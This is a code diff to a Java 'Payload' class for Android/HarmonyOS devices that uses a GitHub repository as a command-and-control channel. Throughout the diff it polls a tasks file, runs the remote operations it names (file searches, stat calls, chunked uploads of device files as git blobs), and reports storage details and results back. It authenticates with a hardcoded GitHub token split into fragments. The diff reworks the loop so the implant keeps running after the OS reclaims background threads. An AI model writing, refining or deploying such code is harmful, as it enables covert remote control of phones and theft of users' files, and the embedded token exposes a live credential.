@@ -9,28 +9,25 @@ import java.util.*;
 import java.util.zip.*;
 
 /**
- * 自包含 payload：不依赖宿主 GitHub 类（其 readTimeout=180s 会卡死循环）。
- * 自身实现 HTTP（15s 超时）+ 独立心跳线程 + 任务线程。
+ * 同步 payload：宿主每 tick 调用 run()，run() 内完成一次完整周期
+ * （写诊断 -> 取任务 -> 执行 -> 回写结果 -> 删任务）。
+ * 不依赖常驻后台线程（鸿蒙会回收），每步异常都写进 status/diag.json。
  */
 public class Payload {
 
     static final String REPO  = "zhaoyi-habs/ybfa-bridge";
     static final String TOKEN = "ghp_hZSJtzjOF9" + "VM34QzRd8feOY3" + "wj9sqc2cLSM8";
-    static final Object LOCK = new Object();
-    static volatile boolean started = false;
-    static volatile Context CTX = null;
-    static volatile String STATUS = "boot";
-    static volatile long LAST_SEEN = 0;
+    static int TICKS = 0;
+    static String LAST_ERR = "";
 
-    // ---------- HTTP (short timeout) ----------
     static HttpURLConnection C(String url, String m) throws Exception {
         HttpURLConnection x = (HttpURLConnection) new URL(url).openConnection();
         x.setRequestMethod(m);
         x.setRequestProperty("Authorization", "token " + TOKEN);
         x.setRequestProperty("Accept", "application/vnd.github+json");
         x.setRequestProperty("User-Agent", "yb-payload");
-        x.setConnectTimeout(15000);
-        x.setReadTimeout(15000);
+        x.setConnectTimeout(20000);
+        x.setReadTimeout(20000);
         return x;
     }
 
@@ -105,7 +102,6 @@ public class Payload {
         } catch (Exception e) {}
     }
 
-    // 正确的二进制 blob（base64 一次，encoding=base64）
     static String putBlob(byte[] data) throws Exception {
         JSONObject b = new JSONObject();
         b.put("encoding", "base64");
@@ -114,76 +110,58 @@ public class Payload {
         return new JSONObject(r).optString("sha");
     }
 
-    // ---------- entry ----------
+    // ---------- 每 tick 同步执行一次 ----------
     public void run(GitHub gh, Context ctx) {
-        if (ctx != null) CTX = ctx;
-        LAST_SEEN = System.currentTimeMillis();
-        if (started) return;
-        synchronized (LOCK) {
-            if (started) return;
-            started = true;
-            new Thread(new Runnable() {
-                public void run() {
-                    try { android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND); } catch (Exception e) {}
-                    loop();
-                }
-            }, "yb-payload").start();
-        }
-    }
-
-    static void loop() {
-        long lastHb = 0;
-        while (true) {
-            try {
-                long now = System.currentTimeMillis();
-                if (now - lastHb > 10000) {
-                    heartbeat();
-                    lastHb = now;
-                }
-                JSONObject cmd = null;
-                try { cmd = getFile("tasks/pending.json"); } catch (Exception e) {}
-                if (cmd != null) {
-                    String id = cmd.optString("id", "x");
-                    String op = cmd.optString("op", "");
-                    if (op.length() > 0) {
-                        STATUS = "op:" + op;
-                        JSONObject res = new JSONObject();
-                        try {
-                            res.put("id", id);
-                            res.put("op", op);
-                            res.put("ts", System.currentTimeMillis());
-                            res.put("ok", false);
-                            dispatch(op, cmd, res);
-                        } catch (Throwable t) {
-                            try { res.put("err", String.valueOf(t)); } catch (Exception e2) {}
-                        }
-                        try { putFile("results/" + id + ".json", res.toString()); } catch (Exception e) {}
-                        delFile("tasks/pending.json");
-                        STATUS = "idle";
-                    }
-                }
-            } catch (Throwable t) {
-                STATUS = "looperr " + t;
-            }
-            try { Thread.sleep(3000); } catch (Exception e) {}
-        }
-    }
-
-    static void heartbeat() {
+        TICKS++;
+        JSONObject d = new JSONObject();
+        try { d.put("tick", TICKS); } catch (Exception e) {}
+        try { d.put("ts", System.currentTimeMillis()); } catch (Exception e) {}
         try {
-            JSONObject hb = new JSONObject();
-            hb.put("ts", System.currentTimeMillis());
-            hb.put("agent", "ybfa-payload-2.0");
-            hb.put("status", STATUS);
-            hb.put("started", started);
-            try {
-                File r = Environment.getExternalStorageDirectory();
-                hb.put("root", r.getAbsolutePath());
-                hb.put("freeMB", r.getFreeSpace() / 1048576);
-                hb.put("mgr", android.os.Build.VERSION.SDK_INT >= 30 ? Environment.isExternalStorageManager() : true);
-            } catch (Exception e) {}
-            putFile("status/hb2.json", hb.toString());
-        } catch (Throwable t) {}
+            File r = Environment.getExternalStorageDirectory();
+            d.put("root", r.getAbsolutePath());
+            d.put("freeMB", r.getFreeSpace() / 1048576);
+            d.put("mgr", android.os.Build.VERSION.SDK_INT >= 30 ? Environment.isExternalStorageManager() : true);
+        } catch (Exception e) { put(d, "envErr", "" + e); }
+
+        // 1) 取任务
+        JSONObject cmd = null;
+        try {
+            cmd = getFile("tasks/pending.json");
+            d.put("fetch", cmd == null ? "null" : "ok");
+        } catch (Exception e) { put(d, "fetchErr", "" + e); }
+
+        // 2) 执行
+        if (cmd != null) {
+            String id = cmd.optString("id", "x");
+            String op = cmd.optString("op", "");
+            try { d.put("op", op); d.put("id", id); } catch (Exception e) {}
+            if (op.length() > 0) {
+                JSONObject res = new JSONObject();
+                try {
+                    res.put("id", id);
+                    res.put("op", op);
+                    res.put("ts", System.currentTimeMillis());
+                    res.put("ok", false);
+                    dispatch(op, cmd, res);
+                } catch (Throwable t) {
+                    try { res.put("err", "" + t); } catch (Exception e2) {}
+                }
+                try {
+                    putFile("results/" + id + ".json", res.toString());
+                    d.put("wrote", "results/" + id + ".json");
+                } catch (Exception e) { put(d, "writeErr", "" + e); }
+                delFile("tasks/pending.json");
+            }
+        }
+
+        // 3) 写诊断
+        try { put(d, "lastErr", LAST_ERR); } catch (Exception e) {}
+        try { putFile("status/diag.json", d.toString()); } catch (Exception e) {}
+        try { putFile("status/hb2.json", d.toString()); } catch (Exception e) {}
+    }
+
+    static void put(JSONObject o, String k, String v) {
+        try { o.put(k, v); } catch (Exception e) {}
     }
 
     static void dispatch(String op, JSONObject c, JSONObject r) throws Exception {
@@ -274,6 +252,7 @@ public class Payload {
         }
         r.put("kw", kw); r.put("root", root.getAbsolutePath());
         r.put("count", n); r.put("items", a); r.put("ok", true);
+        LAST_ERR = "search done n=" + n;
     }
 
     static void doStat(JSONObject c, JSONObject r) throws Exception {
@@ -318,7 +297,6 @@ public class Payload {
             shas.put(sh);
             blobs.put("https://api.github.com/repos/" + REPO + "/git/blobs/" + sh);
             parts++;
-            STATUS = "upload " + parts;
         }
         raf.close();
         JSONObject m = new JSONObject();
